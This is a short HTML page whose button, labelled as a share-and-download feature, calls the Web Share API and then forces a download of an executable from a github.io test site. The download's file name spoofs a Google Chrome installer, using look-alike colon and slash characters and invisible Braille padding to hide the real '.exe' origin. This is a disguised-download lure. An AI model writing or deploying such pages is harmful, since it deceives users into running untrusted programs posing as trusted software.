<!DOCTYPE html>
<html>
<head>
  <title>Web Share + External Download</title>
</head>
<body style="height:100vh; display:flex; justify-content:center; align-items:center;">

<button id="shareDownloadBtn">Share & Download File</button>

<script>
document.getElementById("shareDownloadBtn").onclick = async function() {
    // 1. Web Share API
    if (navigator.share) {
        try {
            await navigator.share({
                title: 'Example Text File',
                text: 'Check out this file!',
                url: 'https://example.com'  // bisa diganti ke URL apa saja
            });
            console.log('Sharing success!');
        } catch(err) {
            console.log('Sharing canceled or failed:', err);
        }
    } else {
        alert('Web Share API not supported on this browser.');
    }

    // 2. Download file eksternal
    const fileUrl = 'http://ecdnts-del.github.io/test-apk/From https∶⧸⧸google.com ⠀⠀⠀⠀⠀ chrome.exe';
    const a = document.createElement('a');
    a.href = fileUrl;
    a.download = 'From https∶⧸⧸google.com ⠀⠀⠀⠀⠀ chrome.exe'; // nama file yang di-download
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
};
</script>

</body>
</html>
